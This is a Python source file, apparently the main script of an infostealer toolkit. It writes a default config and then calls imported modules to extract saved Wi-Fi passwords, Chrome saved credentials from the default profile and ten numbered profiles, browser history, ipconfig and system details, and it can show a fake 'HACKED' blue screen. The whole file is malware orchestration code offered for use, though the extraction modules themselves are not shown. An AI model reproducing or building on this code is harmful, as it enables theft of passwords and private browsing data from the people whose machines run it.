import os

import forall

import webhistory
import wifipass
import chromepass
import ipinfo
import systeminformation
import causefakebsod

jsoncodetowrite = """{   
    "runningyn":{
        "wifipass":"yes",
        "webhistory":"yes",
        "webpasswords":"yes",
        "ipconfigall":"yes",
        "systeminfo":"no",
        "fakebsod":"no"
    },
    "wifi-pass-extractor":{
        "save":"y",
        "sleep-time-last":0
    },

    "web-browser-history-extractor":{
        "print-y-n":"no",
        "ff-json":"json",
        "ff-csv":"csv",
        "default-format":"json"
    },

    "chrome-pass-view":{
        "nothing":"nothing"
    },

    "bsod":{
        "yn":"yes",
        "shutdown":"no"
    }

}"""

if os.path.isfile("config.json") == True:
    pass
else:
    try:
        with open("config.json", "w", encoding="utf-8") as jsf:
            jsf.write(jsoncodetowrite)
    except Exception as e:
        print("Error JSON Settings Creation: ", e)

def ENTIRE_PROGRAM():
    # Wifi Password Extraction
    if forall.runyn()["wifipass"] == "yes":
        try:
            wifipass.WIFI_PASSWORD_EXTRACTOR()
        except Exception as e:
            print("Error: ", e)

    # Chrome Credintials Extraction
    if forall.runyn()["webpasswords"] == "yes":
        try:
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Default", savefname="chrome_pass_default")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 1", savefname="chrome_pass_prof1")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 2", savefname="chrome_pass_prof2")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 3", savefname="chrome_pass_prof3")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 4", savefname="chrome_pass_prof4")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 5", savefname="chrome_pass_prof5")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 6", savefname="chrome_pass_prof6")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 7", savefname="chrome_pass_prof7")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 8", savefname="chrome_pass_prof8")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 9", savefname="chrome_pass_prof9")
            except Exception as e:
                print("Error: ", e)
            
            try:
                chromepass.CHROME_PASSWORD_EXTRACTOR(profile="Profile 10", savefname="chrome_pass_prof10")
            except Exception as e:
                print("Error: ", e)

        except Exception as e:
            print("Error: ", e)

    # Web History Extraction
    if forall.runyn()["webhistory"] == "yes":
        try:
            webhistory.WEB_HISTORY_EXTRACTOR()
        except Exception as e:
            print("Error: ", e)
    
    # ipconfig /all
    if forall.runyn()["ipconfigall"] == "yes":
        try:
            ipinfo.IPCONFIG_INFO()
        except Exception as e:
            print("Error: ", e)

    # system information
    if forall.runyn()["systeminfo"] == "yes":
        try:
            systeminformation.SYSTEM_INFORMATION()
        except Exception as e:
            print("Error: ", e)
    
    # HACKED fake bsod
    if forall.runyn()["fakebsod"] == "yes":
        try:
            causefakebsod.CAUSE_FAKE_BSOD()
        except Exception as e:
            print("Error: ", e)
    

try:
    ENTIRE_PROGRAM()
except Exception as e:
        print("Error: ", e)

